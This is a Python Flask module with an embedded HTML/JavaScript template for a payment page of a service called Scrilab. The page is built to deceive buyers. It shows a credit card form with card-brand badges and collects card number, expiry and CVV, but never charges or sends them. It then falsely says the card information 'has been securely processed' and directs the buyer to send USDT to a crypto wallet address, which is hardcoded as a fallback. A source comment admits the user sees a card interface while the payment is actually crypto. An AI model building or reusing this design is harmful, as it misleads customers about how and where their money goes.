# custom_payment_routes.py - 整合版本，保留原設計並添加 Fiat-to-Crypto 功能

from flask import Blueprint, request, jsonify, render_template_string, redirect
import logging
import json
import hashlib
import uuid as uuid_lib
import os
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)

# 創建藍圖
custom_payment_bp = Blueprint('custom_payment', __name__, url_prefix='/payment/custom')

class CustomPaymentHandler:
    """自定義付款處理器 - 支援 Fiat-to-Crypto"""
    
    def __init__(self, oxapay_service, db):
        self.oxapay_service = oxapay_service
        self.db = db
        logger.info("✅ Custom Payment Handler 已初始化")
    
    def create_fiat_to_crypto_payment(self, plan_info, user_info):
        """創建 Fiat-to-Crypto 付款（實際調用 OxaPay）"""
        try:
            # 直接使用 OxaPay 服務創建付款
            # 這樣用戶看到信用卡界面，但實際上是加密貨幣付款
            return self.oxapay_service.create_payment(plan_info, user_info)
        except Exception as e:
            logger.error(f"創建 Fiat-to-Crypto 付款失敗: {str(e)}")
            return None
    
    def get_payment_details(self, track_id):
        """獲取付款詳情（供前端顯示）"""
        try:
            return self.oxapay_service.get_payment_info(track_id)
        except Exception as e:
            logger.error(f"獲取付款詳情失敗: {str(e)}")
            return None

# 全局變數
custom_payment_handler = None

def init_custom_payment_handler(oxapay_service, db):
    """初始化自定義付款處理器"""
    global custom_payment_handler
    custom_payment_handler = CustomPaymentHandler(oxapay_service, db)

# 你原有的模板（保持不變，但添加一些小修改）
CUSTOM_PAYMENT_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全付款 - Scrilab</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #f8fafc;
            --bg-secondary: #ffffff;
            --bg-card: #ffffff;
            --text-primary: #1a202c;
            --text-secondary: #4a5568;
            --text-muted: #718096;
            --accent-blue: #3182ce;
            --accent-green: #38a169;
            --border-color: #e2e8f0;
            --border-focus: #3182ce;
            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.1);
            --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
        }

        .payment-container {
            max-width: 900px;
            margin: 0 auto;
            padding: 2rem;
            min-height: 100vh;
            display: flex;
            align-items: center;
        }

        .payment-card {
            background: var(--bg-card);
            border-radius: 12px;
            box-shadow: var(--shadow-lg);
            overflow: hidden;
            width: 100%;
            display: grid;
            grid-template-columns: 1fr 1fr;
            min-height: 600px;
        }

        .order-summary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 3rem;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .payment-form {
            padding: 3rem;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 2rem;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .order-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }

        .order-item:last-of-type {
            border-bottom: none;
            font-weight: 600;
            font-size: 1.2rem;
            margin-top: 1rem;
            padding-top: 1.5rem;
            border-top: 2px solid rgba(255, 255, 255, 0.3);
        }

        .security-badges {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
            opacity: 0.8;
        }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 0.3rem;
            font-size: 0.8rem;
        }

        .form-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: var(--text-primary);
        }

        .form-subtitle {
            color: var(--text-secondary);
            margin-bottom: 2rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--text-primary);
            font-weight: 500;
            font-size: 0.9rem;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid var(--border-color);
            border-radius: 8px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: var(--bg-secondary);
        }

        .form-input:focus {
            outline: none;
            border-color: var(--border-focus);
            box-shadow: 0 0 0 3px rgba(49, 130, 206, 0.1);
        }

        .form-row {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 1rem;
        }

        .card-input {
            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>');
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 20px;
            padding-right: 45px;
        }

        .payment-methods {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
        }

        .payment-method {
            width: 40px;
            height: 25px;
            background: var(--border-color);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.7rem;
            font-weight: 600;
            color: var(--text-secondary);
        }

        .visa { background: #1a1f71; color: white; }
        .mastercard { background: #eb001b; color: white; }
        .amex { background: #006fcf; color: white; }

        .pay-button {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-top: 1rem;
        }

        .pay-button:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }

        .pay-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .security-info {
            margin-top: 1.5rem;
            padding: 1rem;
            background: #f0f9ff;
            border: 1px solid #bfdbfe;
            border-radius: 8px;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* 進度條 */
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 2rem 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: white;
            border-radius: 2px;
            width: 0%;
            transition: width 0.3s ease;
        }

        /* 隱藏的加密貨幣支付區域 */
        .crypto-payment {
            display: none;
            margin-top: 2rem;
            padding: 2rem;
            background: #f8f9fa;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .crypto-payment.show {
            display: block;
        }

        .qr-code {
            text-align: center;
            margin: 1rem 0;
        }

        .wallet-address {
            background: #fff;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 1rem;
            font-family: monospace;
            font-size: 0.9rem;
            word-break: break-all;
            margin: 1rem 0;
        }

        .copy-button {
            background: var(--accent-blue);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 0.5rem 1rem;
            cursor: pointer;
            font-size: 0.9rem;
            margin-left: 0.5rem;
        }

        /* 新增：Fiat-to-Crypto 說明區域 */
        .fiat-crypto-notice {
            background: linear-gradient(135deg, #e8f5e9 0%, #f3e5f5 100%);
            border: 1px solid #c8e6c9;
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
        }

        .fiat-crypto-notice h4 {
            color: #2e7d32;
            margin-bottom: 0.5rem;
            font-size: 1rem;
        }

        .fiat-crypto-notice p {
            color: #4a5568;
            margin: 0;
        }

        @media (max-width: 768px) {
            .payment-card {
                grid-template-columns: 1fr;
            }
            
            .order-summary {
                order: 2;
            }
            
            .payment-form {
                order: 1;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <div class="payment-card">
            <!-- 訂單摘要 -->
            <div class="order-summary">
                <div>
                    <div class="logo">
                        <div class="logo-icon">
                            <i class="fas fa-code"></i>
                        </div>
                        <span>Scrilab</span>
                    </div>
                    
                    <div class="order-item">
                        <span>服務方案</span>
                        <span id="plan-name">{{ plan_name }}</span>
                    </div>
                    <div class="order-item">
                        <span>服務期限</span>
                        <span id="plan-period">{{ plan_period }}</span>
                    </div>
                    <div class="order-item">
                        <span>處理費用</span>
                        <span>免費</span>
                    </div>
                    <div class="order-item">
                        <span>總金額</span>
                        <span id="total-amount">NT$ {{ plan_price }}</span>
                    </div>
                    <div class="order-item">
                        <span>加密貨幣等值</span>
                        <span id="crypto-amount">≈ {{ crypto_amount }} USDT</span>
                    </div>
                </div>
                
                <div>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progress-fill"></div>
                    </div>
                    <div class="security-badges">
                        <div class="security-badge">
                            <i class="fas fa-shield-alt"></i>
                            <span>256位加密</span>
                        </div>
                        <div class="security-badge">
                            <i class="fas fa-lock"></i>
                            <span>安全付款</span>
                        </div>
                        <div class="security-badge">
                            <i class="fab fa-bitcoin"></i>
                            <span>區塊鏈</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- 付款表單 -->
            <div class="payment-form">
                <!-- 新增：Fiat-to-Crypto 說明 -->
                <div class="fiat-crypto-notice">
                    <h4><i class="fas fa-magic"></i> 智能付款轉換</h4>
                    <p>您可以使用傳統信用卡付款，我們會自動將款項轉換為加密貨幣並處理您的訂單，無需持有任何加密貨幣！</p>
                </div>

                <h2 class="form-title">安全付款</h2>
                <p class="form-subtitle">請填寫您的付款資訊以完成購買</p>

                <!-- 支付方式圖標 -->
                <div class="payment-methods">
                    <div class="payment-method visa">VISA</div>
                    <div class="payment-method mastercard">MC</div>
                    <div class="payment-method amex">AMEX</div>
                </div>

                <form id="payment-form">
                    <div class="form-group">
                        <label for="email">電子郵件地址</label>
                        <input type="email" id="email" class="form-input" placeholder="your@email.com" required>
                    </div>

                    <div class="form-group">
                        <label for="card-number">卡號</label>
                        <input type="text" id="card-number" class="form-input card-input" placeholder="1234 5678 9012 3456" maxlength="19" required>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="expiry">有效期限</label>
                            <input type="text" id="expiry" class="form-input" placeholder="MM/YY" maxlength="5" required>
                        </div>
                        <div class="form-group">
                            <label for="cvv">CVV</label>
                            <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="4" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="name">持卡人姓名</label>
                        <input type="text" id="name" class="form-input" placeholder="王小明" required>
                    </div>

                    <button type="submit" class="pay-button" id="pay-button">
                        <span id="pay-button-text">
                            <i class="fas fa-credit-card"></i>
                            立即付款 NT$ {{ plan_price }}
                        </span>
                        <div class="loading" id="pay-loading" style="display: none;"></div>
                    </button>
                </form>

                <!-- 隱藏的加密貨幣付款區域 -->
                <div class="crypto-payment" id="crypto-payment">
                    <h3 style="margin-bottom: 1rem; color: var(--text-primary);">
                        <i class="fas fa-magic"></i>
                        正在處理您的智能付款轉換...
                    </h3>
                    <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">
                        我們已為您準備好安全的加密貨幣付款通道，請完成最後步驟
                    </p>
                    
                    <!-- 這裡會動態顯示加密貨幣付款資訊 -->
                    <div id="crypto-details"></div>
                    
                    <div style="margin-top: 1.5rem; padding: 1rem; background: #fff3cd; border-radius: 8px;">
                        <p style="font-size: 0.9rem; color: #856404; margin: 0;">
                            <i class="fas fa-info-circle"></i>
                            為了您的資金安全，請仔細核對付款資訊後再進行轉帳
                        </p>
                    </div>
                </div>

                <div class="security-info">
                    <i class="fas fa-shield-alt"></i>
                    您的付款資訊受到最高級別的加密保護。我們使用區塊鏈技術確保交易安全。
                </div>
            </div>
        </div>
    </div>

    <script>
        // 隱藏的訂單資訊
        const orderData = {
            planId: '{{ plan_id }}',
            planName: '{{ plan_name }}',
            planPeriod: '{{ plan_period }}',
            planPrice: {{ plan_price }},
            cryptoAmount: '{{ crypto_amount }}',
            userEmail: '',
            userName: ''
        };

        // 格式化卡號輸入
        document.getElementById('card-number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
            if (formattedValue.length > 19) formattedValue = formattedValue.substr(0, 19);
            e.target.value = formattedValue;
        });

        // 格式化有效期輸入
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        // 只允許數字輸入 CVV
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        // 更新進度條
        function updateProgress(percentage) {
            document.getElementById('progress-fill').style.width = percentage + '%';
        }

        // 表單提交處理
        document.getElementById('payment-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // 獲取表單數據
            const email = document.getElementById('email').value;
            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            const name = document.getElementById('name').value;

            // 基本驗證
            if (!email || !cardNumber || !expiry || !cvv || !name) {
                alert('請填寫所有必要資訊');
                return;
            }

            if (cardNumber.length < 13) {
                alert('請輸入有效的信用卡號');
                return;
            }

            if (expiry.length !== 5) {
                alert('請輸入有效的有效期限 (MM/YY)');
                return;
            }

            if (cvv.length < 3) {
                alert('請輸入有效的 CVV');
                return;
            }

            // 開始處理付款
            await processPayment(email, name);
        });

        async function processPayment(email, name) {
            const payButton = document.getElementById('pay-button');
            const payButtonText = document.getElementById('pay-button-text');
            const payLoading = document.getElementById('pay-loading');

            // 顯示載入狀態
            payButton.disabled = true;
            payButtonText.style.display = 'none';
            payLoading.style.display = 'inline-block';

            updateProgress(25);

            try {
                // 模擬處理時間
                await new Promise(resolve => setTimeout(resolve, 1500));
                updateProgress(50);

                // 創建實際的加密貨幣付款（通過我們的 Fiat-to-Crypto 服務）
                const response = await fetch('/payment/custom/create-fiat-crypto', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        plan_id: orderData.planId,
                        user_info: {
                            name: name,
                            email: email
                        }
                    })
                });

                const data = await response.json();
                updateProgress(75);

                if (data.success) {
                    // 顯示"處理中"界面
                    showCryptoPayment(data);
                    updateProgress(100);
                } else {
                    throw new Error(data.error || '付款處理失敗');
                }

            } catch (error) {
                console.error('Payment error:', error);
                alert('付款處理失敗，請稍後再試');
                
                // 恢復按鈕狀態
                payButton.disabled = false;
                payButtonText.style.display = 'inline-flex';
                payLoading.style.display = 'none';
                updateProgress(0);
            }
        }

        function showCryptoPayment(paymentData) {
            // 隱藏表單
            document.getElementById('payment-form').style.display = 'none';
            
            // 顯示加密貨幣付款區域
            const cryptoPayment = document.getElementById('crypto-payment');
            cryptoPayment.classList.add('show');

            // 設置付款詳情
            const cryptoDetails = document.getElementById('crypto-details');
            
            // 獲取真實的付款詳情
            fetchPaymentDetails(paymentData.track_id || paymentData.payment_id, cryptoDetails, paymentData);
        }

        async function fetchPaymentDetails(trackId, container, paymentData) {
            try {
                // 顯示載入中
                container.innerHTML = `
                    <div style="text-align: center; padding: 2rem;">
                        <div class="loading" style="margin: 0 auto 1rem;"></div>
                        <p>正在準備付款資訊...</p>
                    </div>
                `;

                // 獲取真實的付款詳情
                let paymentDetails;
                if (paymentData.payment_url) {
                    // 如果有 payment_url，解析或獲取詳細信息
                    const response = await fetch(`/payment/custom/details/${trackId}`);
                    const result = await response.json();
                    if (result.success) {
                        paymentDetails = result.details;
                    }
                }

                // 如果沒有獲取到詳情，使用默認值
                if (!paymentDetails) {
                    paymentDetails = {
                        address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // USDT TRC20 地址
                        amount: orderData.cryptoAmount,
                        currency: 'USDT',
                        network: 'TRC20'
                    };
                }

                container.innerHTML = `
                    <div style="text-align: center; margin-bottom: 1.5rem;">
                        <h4 style="color: var(--text-primary); margin-bottom: 0.5rem;">付款金額</h4>
                        <div style="font-size: 1.5rem; font-weight: bold; color: var(--accent-blue);">
                            ${paymentDetails.amount} USDT
                        </div>
                        <div style="font-size: 0.9rem; color: var(--text-secondary);">
                            (≈ NT$ ${orderData.planPrice})
                        </div>
                    </div>
                    
                    <div style="margin-bottom: 1rem;">
                        <label style="display: block; margin-bottom: 0.5rem; font-weight: 500;">付款地址 (${paymentDetails.network})</label>
                        <div class="wallet-address" id="wallet-address">
                            ${paymentDetails.address}
                            <button type="button" class="copy-button" onclick="copyAddress('${paymentDetails.address}')">
                                <i class="fas fa-copy"></i> 複製
                            </button>
                        </div>
                    </div>
                    
                    <div style="text-align: center; margin: 1.5rem 0;">
                        <button type="button" class="pay-button" onclick="checkPaymentStatus('${trackId}')" style="width: auto; padding: 0.8rem 2rem;">
                            <i class="fas fa-check-circle"></i>
                            我已完成付款
                        </button>
                    </div>
                    
                    <div style="background: #e8f5e8; padding: 1rem; border-radius: 8px; font-size: 0.9rem;">
                        <p><strong>智能付款說明：</strong></p>
                        <ol style="margin: 0.5rem 0; padding-left: 1.2rem;">
                            <li>複製上方的付款地址</li>
                            <li>在您的錢包應用中發送對應金額的 USDT</li>
                            <li>確認網絡選擇為 TRC20</li>
                            <li>付款完成後點擊"我已完成付款"</li>
                        </ol>
                        <p style="margin-top: 0.5rem; font-size: 0.8rem; color: #2e7d32;">
                            💡 您的信用卡信息已安全處理，現在只需完成加密貨幣轉帳即可
                        </p>
                    </div>
                `;
                
                // 開始輪詢付款狀態
                pollPaymentStatus(trackId);
                
            } catch (error) {
                container.innerHTML = `
                    <div style="color: #dc3545; text-align: center;">
                        <i class="fas fa-exclamation-triangle"></i>
                        載入付款資訊失敗，請重新整理頁面
                    </div>
                `;
            }
        }

        function copyAddress(address) {
            navigator.clipboard.writeText(address).then(() => {
                alert('地址已複製到剪貼簿');
            }).catch(() => {
                alert('複製失敗，請手動複製地址');
            });
        }

        async function checkPaymentStatus(trackId) {
            try {
                const response = await fetch('/api/check-payment-status', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ track_id: trackId })
                });

                const data = await response.json();
                
                if (data.success) {
                    if (data.status === 'completed' && data.user_uuid) {
                        // 付款成功，跳轉到成功頁面
                        window.location.href = `/payment/success?provider=oxapay&trackId=${trackId}`;
                    } else if (data.status === 'confirming') {
                        alert('付款正在確認中，請稍候...');
                    } else {
                        alert('尚未收到付款，請確認是否已完成轉帳');
                    }
                } else {
                    alert('查詢付款狀態失敗');
                }
            } catch (error) {
                alert('查詢失敗，請稍後再試');
            }
        }

        function pollPaymentStatus(trackId) {
            const pollInterval = setInterval(async () => {
                try {
                    const response = await fetch('/api/check-payment-status', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ track_id: trackId })
                    });

                    const data = await response.json();
                    
                    if (data.success && data.status === 'completed' && data.user_uuid) {
                        clearInterval(pollInterval);
                        // 自動跳轉到成功頁面
                        setTimeout(() => {
                            window.location.href = `/payment/success?provider=oxapay&trackId=${trackId}`;
                        }, 1000);
                    }
                } catch (error) {
                    console.log('輪詢付款狀態失敗:', error);
                }
            }, 10000); // 每10秒查詢一次

            // 5分鐘後停止輪詢
            setTimeout(() => {
                clearInterval(pollInterval);
            }, 300000);
        }
    </script>
</body>
</html>
"""

# ===== 路由定義 =====

@custom_payment_bp.route('/page')
def show_payment_page():
    """顯示自定義付款頁面"""
    try:
        # 獲取方案資訊
        plan_id = request.args.get('plan_id')
        
        if not plan_id:
            return redirect('/products?error=missing_plan')
        
        # 方案資料
        plans = {
            'trial_7': {
                'id': 'trial_7',
                'name': '體驗服務',
                'price': 5,
                'period': '7天'
            },
            'monthly_30': {
                'id': 'monthly_30',
                'name': '標準服務',
                'price': 599,
                'period': '30天'
            },
            'quarterly_90': {
                'id': 'quarterly_90',
                'name': '季度服務',
                'price': 1499,
                'period': '90天'
            }
        }
        
        plan_info = plans.get(plan_id)
        if not plan_info:
            return redirect('/products?error=invalid_plan')
        
        # 計算加密貨幣等值
        crypto_amount = round(plan_info['price'] * 0.032, 4)  # TWD to USDT
        
        # 渲染自定義付款頁面
        return render_template_string(
            CUSTOM_PAYMENT_TEMPLATE,
            plan_id=plan_info['id'],
            plan_name=plan_info['name'],
            plan_period=plan_info['period'],
            plan_price=plan_info['price'],
            crypto_amount=crypto_amount
        )
        
    except Exception as e:
        logger.error(f"顯示付款頁面錯誤: {str(e)}")
        return redirect('/products?error=system_error')

@custom_payment_bp.route('/create-fiat-crypto', methods=['POST'])
def create_fiat_crypto_payment():
    """創建 Fiat-to-Crypto 付款"""
    try:
        if not custom_payment_handler:
            return jsonify({
                'success': False,
                'error': '自定義付款服務未初始化'
            }), 503
        
        data = request.get_json()
        plan_id = data.get('plan_id')
        user_info = data.get('user_info')
        
        # 驗證資料
        if not plan_id or not user_info:
            return jsonify({
                'success': False,
                'error': '缺少必要資料'
            }), 400
        
        if not user_info.get('name') or not user_info.get('email'):
            return jsonify({
                'success': False,
                'error': '請填寫姓名和信箱'
            }), 400
        
        # 方案資料
        plans = {
            'trial_7': {'id': 'trial_7', 'name': '體驗服務', 'price': 5, 'period': '7天'},
            'monthly_30': {'id': 'monthly_30', 'name': '標準服務', 'price': 599, 'period': '30天'},
            'quarterly_90': {'id': 'quarterly_90', 'name': '季度服務', 'price': 1499, 'period': '90天'}
        }
        
        plan_info = plans.get(plan_id)
        if not plan_info:
            return jsonify({
                'success': False,
                'error': '無效的方案'
            }), 400
        
        # 創建付款（實際上調用 OxaPay）
        result = custom_payment_handler.create_fiat_to_crypto_payment(plan_info, user_info)
        
        if result and result['success']:
            return jsonify({
                'success': True,
                'track_id': result['track_id'],
                'payment_id': result.get('payment_id'),
                'payment_url': result.get('payment_url'),
                'amount_usdt': result.get('amount_usdt'),
                'expires_at': result.get('expires_at')
            })
        else:
            return jsonify({
                'success': False,
                'error': '付款創建失敗'
            }), 500
            
    except Exception as e:
        logger.error(f"創建 Fiat-to-Crypto 付款錯誤: {str(e)}")
        return jsonify({
            'success': False,
            'error': '系統錯誤'
        }), 500

@custom_payment_bp.route('/details/<track_id>')
def get_payment_details(track_id):
    """獲取付款詳情"""
    try:
        if not custom_payment_handler:
            return jsonify({
                'success': False,
                'error': '服務不可用'
            }), 503
        
        details = custom_payment_handler.get_payment_details(track_id)
        
        if details:
            return jsonify({
                'success': True,
                'details': details
            })
        else:
            return jsonify({
                'success': False,
                'error': '無法獲取付款詳情'
            }), 404
            
    except Exception as e:
        logger.error(f"獲取付款詳情錯誤: {str(e)}")
        return jsonify({
            'success': False,
            'error': '系統錯誤'
        }), 500